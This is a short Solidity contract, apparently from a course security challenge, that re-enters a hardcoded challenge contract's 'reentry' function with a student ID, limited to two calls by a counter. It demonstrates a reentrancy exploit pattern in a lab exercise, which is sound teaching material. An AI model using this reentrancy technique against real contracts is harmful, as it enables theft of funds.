/**
 *Submitted for verification at Etherscan.io on 2022-06-15
*/

pragma solidity ^0.4.22;

contract CNSReentry {
    address challenge = 0xC0770a88816Ff575960928AA0AAe0AB0d727d3F6;
    // CNSChallenge challange = CNSChallenge(msg.sender);
    uint count = 0;

    function myReentry(string studentID) public {
        if (count < 2) {
            // CNSChallenge(msg.sender)
            count += 1;
            bool success = challenge.call(bytes4(keccak256("reentry(string studentID)")), studentID);
            require(success);
        }
    }
}